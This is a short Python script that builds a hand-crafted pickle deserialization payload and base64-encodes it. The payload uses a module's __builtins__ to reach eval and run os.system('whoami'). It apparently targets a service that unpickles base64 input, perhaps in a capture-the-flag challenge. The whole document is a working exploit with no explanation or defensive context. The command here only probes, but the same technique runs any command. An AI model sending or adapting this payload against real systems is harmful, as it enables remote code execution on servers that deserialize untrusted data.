import base64

payload = b"cstructs\n__dict__\np0\ncstructs\n__builtins__\np1\ng0\nS'structs'\ng1\nsg1\nS'__import__'\ncstructs\n__getattribute__\nscstructs\nget\n(S'eval'\ntR(S'pickle.sys.modules[\'os\'].system(\'whoami\')'\ntR."
exp = base64.b64encode(payload).decode()

print(exp)
